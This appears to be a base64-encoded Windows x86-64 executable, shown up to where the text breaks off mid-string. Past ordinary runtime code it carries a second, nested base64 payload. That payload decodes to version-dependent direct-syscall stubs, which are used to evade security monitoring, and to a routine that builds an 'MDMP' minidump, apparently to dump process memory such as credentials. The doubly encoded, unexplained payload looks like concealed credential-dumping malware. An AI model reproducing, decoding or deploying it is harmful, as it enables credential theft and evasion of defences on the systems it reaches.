mDy/CD4fvAAAAZg8uwkiLXCRYegt1CYDhAQ+F0vD//8dEJEgQAAAA6YD9//9mDy7GjX0BSItcJFhIiUQkWIl8JFAPipn8//9mDy/GD4WP/P//x0QkSAAAAADpxfP//419AUiLXCRYSInBiXwkUOmC8P//Zg8QyOno/P//TInhRTHAugoAAADo8QQAAEmJxITbD4U6////i0QkcIlEJFCLhCSMAAAAiUQkTOnV9f//QYtPGLgQAAAAhckPREQkSIlEJEjpTPn//w+2UP9Ii1wkWEiJwekc8P//RYtXGEWF0g+FK/v//4XAD49x/v//TInnTYn06b37//9Ii1wkWEiJwenv7///RYtPGEyJ502J9EWFyXRBx0QkSBAAAADplPv//w+E6vn//+mJ+f//dQn2wwEPhUr+///HRCRUIAAAAOlR/v//x0QkSAAAAABEjUUB6Vf8//+LRCRUiUQkSOlT+///QYN/FAF+CrgQAAAA6aL2//9Bg38YALoQAAAAD0XC6ZD2//+J6OlN9f//QVRVV1ZTSGNZFInVSYnKQYnRwf0FOet+f0yNYRhIY+1NjRycSY00rEGD4R8PhH4AAACLBkSJyb8gAAAASI1WBEQpz9PoQYnASTnTD4aXAAAATInmDx9AAIsCiflIg8YESIPCBNPgRInJRAnAiUb8RItC/EHT6Ek503fdSCnrSY1EnPxEiQBFhcB0QkiDwATrPA8fgAAAAABBx0IUAAAAAEHHQhgAAAAAW15fXUFcw5BMiedJOfN24A8fhAAAAAAApUk583f6SCnrSY0EnEwp4EjB+AJBiUIUhcB0xFteX11BXMMPH0QAAEGJQhiFwHSoTIng65ZmZi4PH4QAAAAAAEUxwEhjURRIjUEYSI0MkEg5yHIZ6ylmLg8fhAAAAAAASIPABEGDwCBIOcF2EosQhdJ07Ug5wXYH8w+80kEB0ESJwMOQkJCQkJCQkJCQkJCQVlNIg+woiwWksQAAic6D+AJ0e4XAdDmD+AF1I0iLHf24AAAPH0QAALkBAAAA/9OLBXuxAACD+AF07oP4AnRPSIPEKFtew2YuDx+EAAAAAAC4AQAAAIcFVbEAAIXAdVFIix2SuAAASI0NU7EAAP/TSI0NcrEAAP/TSI0NYQAAAOgcq///xwUisQAAAgAAAEhjzkiNBSixAABIjRSJSI0M0EiDxChbXkj/JTO4AAAPHwCD+AJ0G4sF9bAAAIP4AQ+EWP///+lx////Dx+AAAAAAMcF1rAAAAIAAADrsg8fQABTSIPsILgDAAAAhwXAsAAAg/gCdAtIg8QgW8MPH0QAAEiLHdG3AABIjQ2ysAAA/9NIjQ3RsAAASInYSIPEIFtI/+BmZi4PH4QAAAAAAA8fAFZTSIPsOInLMcnowf7//4P7CX5Midm+AQAAANPmSGPGSI0MhSMAAABIuPj///8HAAAASCHB6EYMAABIhcB0F4M9OrAAAAKJWAiJcAx0NUjHQBAAAAAASIPEOFteww8fAEiNFcmvAABIY8tIiwTKSIXAdC1MiwCDPQOwAAACTIkEynXLSIlEJChIjQ0BsAAA/xVDtwAASItEJCjrsg8fQACJ2b4BAAAASIsFsmQAAEyNBXumAADT5khj1kiJwUiNFJUjAAAATCnBSMHqA0jB+QOJ0kgB0UiB+SABAAAPhzL///9IjRTQSIkVc2QAAOlN////ZmYuDx+EAAAAAAAPHwBBVEiD7CBJicxIhcl0OoN5CAl+DEiDxCBBXOl5CwAAkDHJ6Kn9//9JY1QkCEiNBf2uAACDPUavAAACSIsM0EyJJNBJiQwkdAhIg8QgQVzDkEiNDTmvAABIg8QgQVxI/yV0tgAAZmYuDx+EAAAAAACQQVVBVFZTSIPsKItxFEmJzElj2EhjyjHSDx+EAAAAAABBi0SUGEgPr8FIAdhBiUSUGEiJw0iDwgFIwesgOdZ/4E2J5UiF23QaQTl0JAx+IUhjxoPGAU2J5UGJXIQYQYl0JBRMiehIg8QoW15BXEFdw0GLRCQIjUgB6BP+//9JicVIhcB03UiNSBBJY0QkFEmNVCQQTI0EhQgAAADoaAoAAEyJ4U2J7Ojl/v//66IPHwBTSIPsMInLMcnoovz//0iLBQOuAABIhcB0LkiLEIM9PK4AAAJIiRXtrQAAdGaJWBhIuwAAAAABAAAASIlYEEiDxDBbww8fQABIiwXxYgAASI0NuqQAAEiJwkgpykjB+gNIg8IFSIH6IAEAAHZDuSgAAADo6QkAAEiFwHTCSLoBAAAAAgAAAIM9060AAAJIiVAIdZpIiUQkKEiNDdGtAAD/FRO1AABIi0QkKOuBDx9AAEiNUChIiRWFYgAA678PHwBBV0FWQVVBVFVXVlNIg+woSGNpFEhjehRJic1Jidc5/XwOifhJic9IY/1JidVIY+gxyY0cL0E5XwwPnMFBA08I6Nv8//9JicRIhcAPhPQAAABMjVgYSGPDSY00g0k583MjSInwTInZMdJMKeBIg+gZSMHoAkyNBIUEAAAA6A8JAABJicNNjU0YTY13GEmNLKlJjTy+STnpD4OGAAAASIn4TCn4SYPHGUiD6BlIwegCTDn/TI0shQQAAAC4BAAAAEwPQujrDA8fAEmDwwRMOc12UkWLEUmDwQRFhdJ060yJ2UyJ8kUxwGYuDx+EAAAAAACLAkSLOUiDwgRIg8EESQ+vwkwB+EwBwEmJwIlB/EnB6CBIOdd32keJBCtJg8METDnNd66F238O6xcPH4AAAAAAg+sBdAuLRvxIg+4EhcB08EGJXCQUTIngSIPEKFteX11BXEFdQV5BX8MPH4AAAAAAQVZBVUFUVVdWU0iD7CCJ0EmJzYnTg+ADD4U6AQAAwfsCTYnsdHVIiz2jogAASIX/D4RSAQAATYnsTIstWLMAAEiNLamrAABNie7rEw8fQADR+3RHSIs3SIX2dFRIiff2wwF07EiJ+kyJ4egx/v//SInGSIXAD4QFAQAATYXkD4ScAAAAQYN8JAgJflRMieFJifTowQcAANH7dblMieBIg8QgW15fXUFcQV1BXsMPHwC5AQAAAOjW+f//SIs3SIX2dG6DPXerAAACdZFIjQ2mqwAAQf/W64VmDx+EAAAAAAAxyeip+f//SWNEJAiDPU2rAAACSItUxQBMiWTFAEmJFCRJifQPhUb///9IjQ0/qwAAQf/V6Tf///8PH4AAAAAASYnE6Sj///8PH4QAAAAAAEiJ+kiJ+ehl/f//SIkHSInGSIXAdDpIxwAAAAAA6XD///9mDx9EAACD6AFIjRXOdQAARTHASJiLFILowfv//0mJxUiFwA+Fo/7//w8fRAAARTHk6RP///+5AQAAAOj++P//SIs9N6EAAEiF/3Qfgz2bqgAAAg+Fi/7//0iNDcaqAAD/FeCxAADpef7//7kBAAAA6Pn5//9IicdIhcB0Hki4AQAAAHECAABIiT3woAAASIlHFEjHBwAAAADrsUjHBdigAAAAAAAARTHk6Zv+//9BVkFVQVRVV1ZTSIPsIEmJzInWi0kIidNBi2wkFMH+BUGLRCQMAfVEjW0BQTnFfgoBwIPBAUE5xX/26IH5//9JicZIhcAPhKIAAABIjXgYhfZ+F0hj9kiJ+THSSMHmAkmJ8EgB9+jGBQAASWNEJBRJjXQkGEyNDIaD4x8PhH8AAABBuiAAAABJifgx0kEp2pCLBonZSYPABEiDxgTT4ESJ0QnQQYlA/ItW/NPqSTnxd99MichJjUwkGUwp4EiD6BlIwegCSTnJuQQAAABIjQSFBAAAAEgPQsGF0kEPRe2JFAdBiW4UTInh6NP5//9MifBIg8QgW15fXUFcQV1BXsOQpUk58XbbpUk58Xf069NmkEhjQhREi0EUSYnRQSnAdTxIjRSFAAAAAEiDwRhIjQQRSY1UERjrDmYPH4QAAAAAAEg5wXMXSIPoBEiD6gREixJEORB060UZwEGDyAFEicDDQVRVV1ZTSIPsIEhjQhSLeRRIic5IidMpxw+FYQEAAEiNFIUAAAAASI1JGEiNBBFIjVQTGOsTZi4PH4QAAAAAAEg5wQ+DVwEAAEiD6ARIg+oERIsaRDkYdOcPgiwBAACLTgjo+ff//0mJwEiFwA+E+AAAAIl4EEhjRhRIjW4YTY1gGLkYAAAAMdJJicFMjVyFAEhjQxRIjXyDGGYPH0QAAIsEDkgp0IsUC0gp0EGJBAhIicJIg8EEQYnCSMHqIEiNBBmD4gFIOcd31kiJ+EiNcxlIKdi7AAAAAEiD6BlIicFIg+D8SMHpAkg590gPQsNIjQyNBAAAALsEAAAATAHgSDn3SA9Cy0gBzUkBzEk563Y/TInjSInpZg8fhAAAAAAAiwFIg8EESIPDBEgp0EiJwolD/EGJwkjB6iCD4gFJOct33kmNQ/9IKehIg+D8TAHgRYXSdRIPHwCLUPxIg+gEQYPpAYXSdPFFiUgUTInASIPEIFteX11BXMMPH4AAAAAAvwAAAAAPidT+//9IifC/AQAAAEiJ3kiJw+nB/v//ZpAxyei59v//SYnASIXAdLxMicBJx0AUAQAAAEiDxCBbXl9dQVzDZmYuDx+EAAAAAABBVFNIY0EUTI1ZGEmJ1LkgAAAATY0Mg4nIRYtB/E2NUfxBD73Qg/IfKdBBiQQkg/oKD46JAAAAg+oLTTnTc2FFi1H4hdJ0YInLRInAidFFidAp09PgidlB0+iJ0UmNUfhECcBB0+INAADwP0jB4CBJOdNzC0GLUfSJ2dPqQQnSSLoAAAAA/////0gh0EwJ0GZID27AW0Fcww8fhAAAAAAARTHShdJ1WUSJwA0AAPA/SMHgIEwJ0GZID27AW0Fcw5C5CwAAAESJwDHbKdHT6A0AAPA/SMHgIE0503MGQYtZ+NPrjUoVQdPgQQnYTAnAZkgPbsBbQVzDZg8fhAAAAAAARInAidFFMdLT4A0AAPA/SMHgIOln////Dx+EAAAAAABXVlNIg+wguQEAAABmSA9+w0iJ10yJxuhU9f//SYnCSIXAD4SOAAAASInZSInYSMHpIInKwekUgeL//w8AQYnRQYHJAAAQAIHh/wcAAEEPRdFBiciF23RwRTHJ80QPvMtEicnT6EWFyXQTuSAAAACJ00QpydPjRInJCdjT6kGJQhiD+gG4AQAAAIPY/0GJUhxBiUIURYXAdVFIY9DB4AVBgekyBAAAQQ+9VJIURIkPg/IfKdCJBkyJ0EiDxCBbXl/DDx+AAAAAADHJQcdCFAEAAAC4AQAAAPMPvMrT6kSNSSBBiVIYRYXAdK9DjYQIzfv//4kHuDUAAABEKciJBkyJ0EiDxCBbXl/DDx+AAAAAAEiJyEiJ0UiNUgEPtgmICITJdBYPH0QAAA+2CkiDwAFIg8IBiAiEyXXvw5CQkJCQkEUxwEiJyEiF0nUU6xcPHwBIg8ABSYnASSnISTnQcwWAOAB17EyJwMOQkJCQkJCQkDHASYnQSIXSdQ/rFw8fQABIg8ABSTnAdApmgzxBAHXwSYnATInAw5CQkJCQkJCQkP8lKq0AAJCQ/yUarQAAkJD/JQqtAACQkP8l+qwAAJCQ/yXqrAAAkJD/JdqsAACQkP8lyqwAAJCQ/yW6rAAAkJD/JaqsAACQkP8lmqwAAJCQ/yWKrAAAkJD/JXqsAACQkP8laqwAAJCQ/yVarAAAkJD/JUqsAACQkP8lOqwAAJCQ/yUqrAAAkJD/JRqsAACQkP8lCqwAAJCQ/yX6qwAAkJD/JeKrAACQkP8lyqsAAJCQ/yWyqwAAkJD/JZqrAACQkP8liqsAAJCQ/yVyqwAAkJD/JWKrAACQkP8lUqsAAJCQ/yUyqwAAkJD/JRKrAACQkFdTSIPsSEiJz0iJ00iF0g+EMwEAAE2FwA+EMwEAAEGLAQ+2EkHHAQAAAACJRCQ8hNIPhKEAAACDvCSIAAAAAXZ3hMAPhacAAABMiUwkeIuMJIAAAABMiUQkcP8VUKoAAIXAdFRMi0QkcEyLTCR4SYP4AQ+E9QAAAEiJfCQgQbkCAAAASYnYx0QkKAEAAACLjCSAAAAAuggAAAD/FSCqAACFwA+EsAAAALgCAAAASIPESFtfww8fQACLhCSAAAAAhcB1TQ+2A2aJB7gBAAAASIPESFtfww8fADHSMcBmiRFIg8RIW1/DZi4PH4QAAAAAAIhUJD1BuQIAAABMjUQkPMdEJCgBAAAASIlMJCDrgGaQx0QkKAEAAACLjCSAAAAASYnYQbkBAAAASIl8JCC6CAAAAP8ViKkAAIXAdBy4AQAAAOucDx9EAAAxwEiDxEhbX8O4/v///+uH6GP+///HACoAAAC4/////+ly////D7YDQYgBuP7////pYv///w8fAEFVQVRXVlNIg+xAMcBJicxIhclmiUQkPkiNRCQ+TInLTA9E4EmJ1UyJxujpBAAAicfo6gQAAEiF24l8JChJifCJRCQgTI0NDaIAAEyJ6kyJ4UwPRcvoJv7//0iYSIPEQFteX0FcQV3DDx+EAAAAAABBVkFVQVRVV1ZTSIPsQEiNBc+hAABNic1NhclJic5IidNMD0ToTInG6IMEAACJxeh0BAAAicdIhdsPhMEAAABIixNIhdIPhLUAAABNhfZ0cEUx5EiF9nUf60pmDx9EAABIixNImEmDxgJJAcRIAcJIiRNMOeZ2LYl8JChJifBNielMifGJbCQgTSng6ID9//+FwH/MTDnmdguFwHUHSMcDAAAAAEyJ4EiDxEBbXl9dQVxBXUFew2YuDx+EAAAAAAAxwEGJ/kiNdCQ+RTHkZolEJD7rDA8fQABImEiLE0kBxIl8JChMAeJNielNifCJbCQgSInx6Bf9//+FwH/b66WQRTHk659mZi4PH4QAAAAAAEFUV1ZTSIPsSDHASYnMSInWTInDZolEJD7oegMAAInH6HsDAABIhduJfCQoSYnwSI0VmqAAAIlEJCBIjUwkPkgPRNpMieJJidnosvz//0iYSIPESFteX0Fcw5CQkJCQkEiD7FhIichmiVQkaESJwUWFwHUcZoH6/wB3WYgQuAEAAABIg8RYw2YPH4QAAAAAAEiNVCRMRIlMJChMjUQkaEG5AQAAAEiJVCQ4MdLHRCRMAAAAAEjHRCQwAAAAAEiJRCQg/xUwpwAAhcB0CItUJEyF0nSu6Of7///HACoAAAC4/////0iDxFjDDx+AAAAAAEFUVlNIg+wwSIXJSYnMSI1EJCuJ00wPRODoigIAAInG6IsCAAAPt9NBifFMieFBicDoOv///0iYSIPEMFteQVzDZmYuDx+EAAAAAAAPH0AAQVZBVUFUVVdWU0iD7DBFMfZJidRIictMicXoQQIAAInH6DICAABJizQkQYnFSIX2dE1Ihdt0YUiF7XUn6Y8AAAAPH4AAAAAASJhIAcNJAcaAe/8AD4SGAAAASIPGAkw59XZtD7cWRYnpQYn4SInZ6Kz+//+FwH/QScfG/////0yJ8EiDxDBbXl9dQVxBXUFeww8fgAAAAABIjWwkK+sXkEhj0IPoAUiYSQHWgHwEKwB0PkiDxgIPtxZFielBifhIienoWf7//4XAf9Xrqw8fAEmJNCTrqWYuDx+EAAAAAABJxwQkAAAAAEmD7gHrkWaQSYPuAeuJkJCQkJCQkJCQkFNIg+wgicvoRAEAAInZSI0USUjB4gRIAdBIg8QgW8OQSIsFeZ4AAMMPH4QAAAAAAEiJyEiHBWaeAADDkJCQkJBTSIPsIEiJyzHJ6LH///9IOcNyD7kTAAAA6KL///9IOcN2FUiNSzBIg8QgW0j/Jd2kAAAPH0QAADHJ6IH///9JicBIidhMKcBIwfgEacCrqqqqjUgQ6K4AAACBSxgAgAAASIPEIFvDZg8fhAAAAAAAU0iD7CBIicsxyehB////SDnDcg+5EwAAAOgy////SDnDdhVIjUswSIPEIFtI/yWVpAAADx9EAACBYxj/f///McnoCv///0gpw0jB+wRp26uqqqqNSxBIg8QgW+kwAAAASIsF2WkAAEiLAMOQkJCQkEiLBdlpAABIiwDDkJCQkJBIiwXZaQAASIsAw5CQkJCQ/yUapQAAkJD/JQKlAACQkP8loqQAAJCQ/yWCpAAAkJD/JXKkAACQkA8fhAAAAAAA/yVKpAAAkJD/JTqkAACQkP8lKqQAAJCQ/yUapAAAkJD/JQqkAACQkP8l+qMAAJCQ/yXqowAAkJD/JdqjAACQkP8lyqMAAJCQ/yW6owAAkJD/JaqjAACQkP8lmqMAAJCQ/yWKowAAkJD/JXqjAACQkP8laqMAAJCQ/yVaowAAkJBVU0iD7DhIjawkgAAAAEiJTdBIiVXYTIlF4EyJTehIjUXYSIlFoEiLXaC5AQAAAEiLBepQAAD/0EmJ2EiLVdBIicHoian//4lFrItFrEiDxDhbXcOQkJCQkJCQkJCQkJDp25X//5CQkJCQkJCQkJCQ//////////9Af0AAAAAAAAAAAAAAAAAA//////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFYwaUo1MGlENVBCSWcrd2c2TDhzQUFCSWlmeGZ3Mll1RHgrRUFBQUFBQUREWmk0UEg0UUFBQUFBQUE4ZlJBQUFaVWlMQkNWZ0FBQUFnN2dZQVFBQUJuUU9nN2dZQVFBQUNuUlE2VDhCQUFDRHVCd0JBQUFCZEIrRHVCd0JBQUFDRDRUT0FBQUFnN2djQVFBQUF3K0V5QUFBQU9rWEFRQUFab0c0SUFFQUFMQWRENFNmQUFBQVpvRzRJQUVBQUxFZEQ0U1hBQUFBNmZRQUFBQm1nYmdnQVFBQUFDZ1BoSmdBQUFCbWdiZ2dBUUFBV2lrUGhKQUFBQUJtZ2JnZ0FRQUFPVGdQaElnQUFBQm1nYmdnQVFBQTF6b1BoSUFBQUFCbWdiZ2dBUUFBcXo5MGZHYUJ1Q0FCQUFEdVFuUjRab0c0SUFFQUFHTkZkSFJtZ2JnZ0FRQUF1a2QwY0dhQnVDQUJBQUM3UjNSc1pvRzRJQUVBQUdGS2RHaG1nYmdnQVFBQVlrcDBaT3RwdUQ0QUFBRHJZN2crQUFBQTYxeTRQd0FBQU90VnVFQUFBQURyVHJoQkFBQUE2MGU0UVFBQUFPdEF1RUVBQUFEck9iaEJBQUFBNnpLNFFRQUFBT3NydUVFQUFBRHJKTGhCQUFBQTZ4MjRRUUFBQU9zV3VFRUFBQURyRDdoQkFBQUE2d2k0UVFBQUFPc0J3MG1KeWc4RncyVklpd1FsWUFBQUFJTzRHQUVBQUFaMERvTzRHQUVBQUFwMFVPay9BUUFBZzdnY0FRQUFBWFFmZzdnY0FRQUFBZytFemdBQUFJTzRIQUVBQUFNUGhNZ0FBQURwRndFQUFHYUJ1Q0FCQUFDd0hRK0Vud0FBQUdhQnVDQUJBQUN4SFErRWx3QUFBT24wQUFBQVpvRzRJQUVBQUFBb0Q0U1lBQUFBWm9HNElBRUFBRm9wRDRTUUFBQUFab0c0SUFFQUFEazRENFNJQUFBQVpvRzRJQUVBQU5jNkQ0U0FBQUFBWm9HNElBRUFBS3MvZEh4bWdiZ2dBUUFBN2tKMGVHYUJ1Q0FCQUFCalJYUjBab0c0SUFFQUFMcEhkSEJtZ2JnZ0FRQUF1MGQwYkdhQnVDQUJBQUJoU25Sb1pvRzRJQUVBQUdKS2RHVHJhYmc1QUFBQTYyTzRPUUFBQU90Y3VEb0FBQURyVmJnN0FBQUE2MDY0UEFBQUFPdEh1RHdBQUFEclFMZzhBQUFBNnptNFBBQUFBT3N5dUR3QUFBRHJLN2c4QUFBQTZ5UzRQQUFBQU9zZHVEd0FBQURyRnJnOEFBQUE2dys0UEFBQUFPc0l1RHdBQUFEckFjTkppY29QQmNObFNJc0VKV0FBQUFDRHVCZ0JBQUFHZEE2RHVCZ0JBQUFLZEZEcFB3RUFBSU80SEFFQUFBRjBINE80SEFFQUFBSVBoTTRBQUFDRHVCd0JBQUFERDRUSUFBQUE2UmNCQUFCbWdiZ2dBUUFBc0IwUGhKOEFBQUJtZ2JnZ0FRQUFzUjBQaEpjQUFBRHA5QUFBQUdhQnVDQUJBQUFBS0ErRW1BQUFBR2FCdUNBQkFBQmFLUStFa0FBQUFHYUJ1Q0FCQUFBNU9BK0VpQUFBQUdhQnVDQUJBQURYT2crRWdBQUFBR2FCdUNBQkFBQ3JQM1I4Wm9HNElBRUFBTzVDZEhobWdiZ2dBUUFBWTBWMGRHYUJ1Q0FCQUFDNlIzUndab0c0SUFFQUFMdEhkR3htZ2JnZ0FRQUFZVXAwYUdhQnVDQUJBQUJpU25SazYybTRQd0FBQU90anVEOEFBQURyWExoQUFBQUE2MVc0UVFBQUFPdE91RUlBQUFEclI3aENBQUFBNjBDNFFnQUFBT3M1dUVJQUFBRHJNcmhDQUFBQTZ5dTRRZ0FBQU9za3VFSUFBQURySGJoQ0FBQUE2eGE0UWdBQUFPc1B1RUlBQUFEckNMaENBQUFBNndIRFNZbktEd1hEWlVpTEJDVmdBQUFBZzdnWUFRQUFCblFPZzdnWUFRQUFDblJRNlQ4QkFBQ0R1QndCQUFBQmRCK0R1QndCQUFBQ0Q0VE9BQUFBZzdnY0FRQUFBdytFeUFBQUFPa1hBUUFBWm9HNElBRUFBTEFkRDRTZkFBQUFab0c0SUFFQUFMRWRENFNYQUFBQTZmUUFBQUJtZ2JnZ0FRQUFBQ2dQaEpnQUFBQm1nYmdnQVFBQVdpa1BoSkFBQUFCbWdiZ2dBUUFBT1RnUGhJZ0FBQUJtZ2JnZ0FRQUExem9QaElBQUFBQm1nYmdnQVFBQXF6OTBmR2FCdUNBQkFBRHVRblI0Wm9HNElBRUFBR05GZEhSbWdiZ2dBUUFBdWtkMGNHYUJ1Q0FCQUFDN1IzUnNab0c0SUFFQUFHRktkR2htZ2JnZ0FRQUFZa3AwWk90cHVDTUFBQURyWTdnakFBQUE2MXk0SkFBQUFPdFZ1Q1VBQUFEclRyZ21BQUFBNjBlNEpnQUFBT3RBdUNZQUFBRHJPYmdtQUFBQTZ6SzRKZ0FBQU9zcnVDWUFBQURySkxnbUFBQUE2eDI0SmdBQUFPc1d1Q1lBQUFEckQ3Z21BQUFBNndpNEpnQUFBT3NCdzBtSnlnOEZ3MlZJaXdRbFlBQUFBSU80R0FFQUFBWjBEb080R0FFQUFBcDBVT2svQVFBQWc3Z2NBUUFBQVhRZmc3Z2NBUUFBQWcrRXpnQUFBSU80SEFFQUFBTVBoTWdBQUFEcEZ3RUFBR2FCdUNBQkFBQ3dIUStFbndBQUFHYUJ1Q0FCQUFDeEhRK0Vsd0FBQU9uMEFBQUFab0c0SUFFQUFBQW9ENFNZQUFBQVpvRzRJQUVBQUZvcEQ0U1FBQUFBWm9HNElBRUFBRGs0RDRTSUFBQUFab0c0SUFFQUFOYzZENFNBQUFBQVpvRzRJQUVBQUtzL2RIeG1nYmdnQVFBQTdrSjBlR2FCdUNBQkFBQmpSWFIwWm9HNElBRUFBTHBIZEhCbWdiZ2dBUUFBdTBkMGJHYUJ1Q0FCQUFCaFNuUm9ab0c0SUFFQUFHSktkR1RyYWJqNUFBQUE2Mk80K1FBQUFPdGN1QXNCQUFEclZiZ09BUUFBNjA2NEZBRUFBT3RIdUJjQkFBRHJRTGdaQVFBQTZ6bTRIUUVBQU9zeXVCOEJBQURySzdnaEFRQUE2eVM0SWdFQUFPc2R1Q01CQUFEckZyZ2pBUUFBNncrNEtBRUFBT3NJdUNnQkFBRHJBY05KaWNvUEJjTmxTSXNFSldBQUFBQ0R1QmdCQUFBR2RBNkR1QmdCQUFBS2RGRHBQd0VBQUlPNEhBRUFBQUYwSDRPNEhBRUFBQUlQaE00QUFBQ0R1QndCQUFBREQ0VElBQUFBNlJjQkFBQm1nYmdnQVFBQXNCMFBoSjhBQUFCbWdiZ2dBUUFBc1IwUGhKY0FBQURwOUFBQUFHYUJ1Q0FCQUFBQUtBK0VtQUFBQUdhQnVDQUJBQUJhS1ErRWtBQUFBR2FCdUNBQkFBQTVPQStFaUFBQUFHYUJ1Q0FCQUFEWE9nK0VnQUFBQUdhQnVDQUJBQUNyUDNSOFpvRzRJQUVBQU81Q2RIaG1nYmdnQVFBQVkwVjBkR2FCdUNBQkFBQzZSM1J3Wm9HNElBRUFBTHRIZEd4bWdiZ2dBUUFBWVVwMGFHYUJ1Q0FCQUFCaVNuUms2Mm00SGdBQUFPdGp1QjRBQUFEclhMZ2ZBQUFBNjFXNElBQUFBT3RPdUNFQUFBRHJSN2doQUFBQTYwQzRJUUFBQU9zNXVDRUFBQURyTXJnaEFBQUE2eXU0SVFBQUFPc2t1Q0VBQUFEckhiZ2hBQUFBNnhhNElRQUFBT3NQdUNFQUFBRHJDTGdoQUFBQTZ3SERTWW5LRHdYRFpVaUxCQ1ZnQUFBQWc3Z1lBUUFBQm5RT2c3Z1lBUUFBQ25SUTZUOEJBQUNEdUJ3QkFBQUJkQitEdUJ3QkFBQUNENFRPQUFBQWc3Z2NBUUFBQXcrRXlBQUFBT2tYQVFBQVpvRzRJQUVBQUxBZEQ0U2ZBQUFBWm9HNElBRUFBTEVkRDRTWEFBQUE2ZlFBQUFCbWdiZ2dBUUFBQUNnUGhKZ0FBQUJtZ2JnZ0FRQUFXaWtQaEpBQUFBQm1nYmdnQVFBQU9UZ1BoSWdBQUFCbWdiZ2dBUUFBMXpvUGhJQUFBQUJtZ2JnZ0FRQUFxejkwZkdhQnVDQUJBQUR1UW5SNFpvRzRJQUVBQUdORmRIUm1nYmdnQVFBQXVrZDBjR2FCdUNBQkFBQzdSM1JzWm9HNElBRUFBR0ZLZEdobWdiZ2dBUUFBWWtwMFpPdHB1QTBBQUFEclk3Z05BQUFBNjF5NERnQUFBT3RWdUE4QUFBRHJUcmdRQUFBQTYwZTRFQUFBQU90QXVCQUFBQURyT2JnUUFBQUE2eks0RUFBQUFPc3J1QkFBQUFEckpMZ1FBQUFBNngyNEVBQUFBT3NXdUJBQUFBRHJEN2dRQUFBQTZ3aTRFQUFBQU9zQncwbUp5ZzhGdzJWSWl3UWxZQUFBQUlPNEdBRUFBQVowRG9PNEdBRUFBQXAwVU9rL0FRQUFnN2djQVFBQUFYUWZnN2djQVFBQUFnK0V6Z0FBQUlPNEhBRUFBQU1QaE1nQUFBRHBGd0VBQUdhQnVDQUJBQUN3SFErRW53QUFBR2FCdUNBQkFBQ3hIUStFbHdBQUFPbjBBQUFBWm9HNElBRUFBQUFvRDRTWUFBQUFab0c0SUFFQUFGb3BENFNRQUFBQVpvRzRJQUVBQURrNEQ0U0lBQUFBWm9HNElBRUFBTmM2RDRTQUFBQUFab0c0SUFFQUFLcy9kSHhtZ2JnZ0FRQUE3a0owZUdhQnVDQUJBQUJqUlhSMFpvRzRJQUVBQUxwSGRIQm1nYmdnQVFBQXUwZDBiR2FCdUNBQkFBQmhTblJvWm9HNElBRUFBR0pLZEdUcmFiZ3pBQUFBNjJPNE13QUFBT3RjdURRQUFBRHJWYmcxQUFBQTYwNjROZ0FBQU90SHVEWUFBQURyUUxnMkFBQUE2em00TmdBQUFPc3l1RFlBQUFEcks3ZzJBQUFBNnlTNE5nQUFBT3NkdURZQUFBRHJGcmcyQUFBQTZ3KzROZ0FBQU9zSXVEWUFBQURyQWNOSmljb1BCY05sU0lzRUpXQUFBQUNEdUJnQkFBQUdkQTZEdUJnQkFBQUtkRkRwUHdFQUFJTzRIQUVBQUFGMEg0TzRIQUVBQUFJUGhNNEFBQUNEdUJ3QkFBQURENFRJQUFBQTZSY0JBQUJtZ2JnZ0FRQUFzQjBQaEo4QUFBQm1nYmdnQVFBQXNSMFBoSmNBQUFEcDlBQUFBR2FCdUNBQkFBQUFLQStFbUFBQUFHYUJ1Q0FCQUFCYUtRK0VrQUFBQUdhQnVDQUJBQUE1T0ErRWlBQUFBR2FCdUNBQkFBRFhPZytFZ0FBQUFHYUJ1Q0FCQUFDclAzUjhab0c0SUFFQUFPNUNkSGhtZ2JnZ0FRQUFZMFYwZEdhQnVDQUJBQUM2UjNSd1pvRzRJQUVBQUx0SGRHeG1nYmdnQVFBQVlVcDBhR2FCdUNBQkFBQmlTblJrNjJtNFBBQUFBT3RqdUR3QUFBRHJYTGc5QUFBQTYxVzRQZ0FBQU90T3VEOEFBQURyUjdnL0FBQUE2MEM0UHdBQUFPczV1RDhBQUFEck1yZy9BQUFBNnl1NFB3QUFBT3NrdUQ4QUFBRHJIYmcvQUFBQTZ4YTRQd0FBQU9zUHVEOEFBQURyQ0xnL0FBQUE2d0hEU1luS0R3WERaaTRQSDRRQUFBQUFBRUZYUVZaQlZVRlVWVmUvQUJBQUFGWk1pYzVUU0lIc0dBWUFBRW1MbVlBQUFBQk1pWVFrMkFFQUFJbVVKSmdCQUFCSWlZd2tvQUVBQUVqSGhDU1lBQUFBQUFBQUFNZUVKS0FBQUFBQUFBQUFTTWVFSkxBQkFBQUFBQUFBeDRRa3VBRUFBQUFBQUFCSXg0UWt3QUVBQUFBQUFBQkl4NFFreUFFQUFBQUFBQURIaENUUUFRQUFJZ2dBQUVqSGhDVG9BUUFBQUFBQUFFakhoQ1R3QVFBQUFBQUFBRWpIaENUNEFRQUFBQUFBQUVqSGhDUUFBZ0FBQUFBQUFNZUVKT0FCQUFBQUFBQUFRZitSaUFBQUFFRzRBQkFBQURIU1NJbkIvOU5JaWNOSWhjQjFOK25EQ2dBQVppNFBINFFBQUFBQUFFaUxycGdBQUFBQi8vK1dpQUFBQUVtSjJFR0orVEhTU0luQi85VklpY05JaGNBUGhKRUtBQUJGTWNsQmlmaElpZHE1QlFBQUFPai8rLy8vUFFRQUFNQjB2b1hBRDRWWUNnQUFpNHdrbUFFQUFFaUoyamxMVUErRlB3b0FBSXQ2QkVpTHJvQUFBQUNKdkNTNEFRQUEvNWFJQUFBQVRJMEVmekhTU0luQlNjSGdBdi9WU0ltRUpMQUJBQUJJaGNBUGhBNEtBQUJJaTc2UUFBQUFTSTJzSkJBQ0FBQk1qYXdrOEFBQUFQK1dpQUFBQUVtSjJESFNUSTJrSkxBQUFBQklpY0c3QVFBQUFQL1hTSTJNSkpBQkFBQklpZkpJamJ3a2hBQUFBT2dBRlFBQWk1UWs0QUVBQUVVeHlVVXh3RWk0VFVSTlVKT25BQUJJaTR3azJBRUFBTWVFSk9BQUFBQUFBQUFBU0ltRUpOQUFBQUJJdUFRQUFBQWdBQUFBU0ltRUpOZ0FBQUJJeDRRazZBQUFBQ0lJQUFEL2xxQUFBQUJJaVhRa0lFbUo2VWlMakNUWUFRQUFRYmdnQUFBQVNJMlV